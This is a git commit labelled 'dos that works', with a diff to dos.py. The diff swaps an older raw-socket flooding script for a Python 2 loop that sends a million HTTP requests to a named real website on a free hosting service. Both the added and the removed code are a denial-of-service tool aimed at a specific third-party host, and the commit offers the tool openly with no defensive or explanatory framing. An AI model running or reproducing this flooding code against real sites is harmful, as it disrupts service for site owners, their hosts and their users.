1c96a5be058277f4f7d249e010bf5ee2c867de37
Menny <mennykizer15@gmail.com>
2017-12-26 19:16:31 +0200

    dos that works

--- dos.py
+++ dos.py
@@ -1,42 +1,14 @@
+import urllib2
+domain = 'ympt.000webhostapp.com'
 
-import socket
-import os
-import sys
-import time
-"""
-host = 'ympt.000webhostapp.com'
-message = 'dos'
-
-ip = socket.gethostbyname(host)
 i = 0
 
 def attack():
-    sock.send(message)
-    print sock.recv(20)
+    urllib2.urlopen("http://{}".format(domain)).read()
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect((host, 80))
 
 for i in range(0,1000000):
     print i
     attack()
 
-
-
-sock.close()"""
-import socket, sys, os
-IP = "ympt.000webhostapp.com"
-message = "hi"
-print "][ Attacking " + IP  + " ... ]["
-print "injecting " + message;
-def attack():
-
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((IP, 80))
-    print ">> GET /" + message + " HTTP/1.1"
-    s.send("GET /" + message + " HTTP/1.1\r\n")
-    s.send("Host: " + IP  + "\r\n\r\n");
-    s.close()
-for i in range(1, 1000):
-    attack()
 
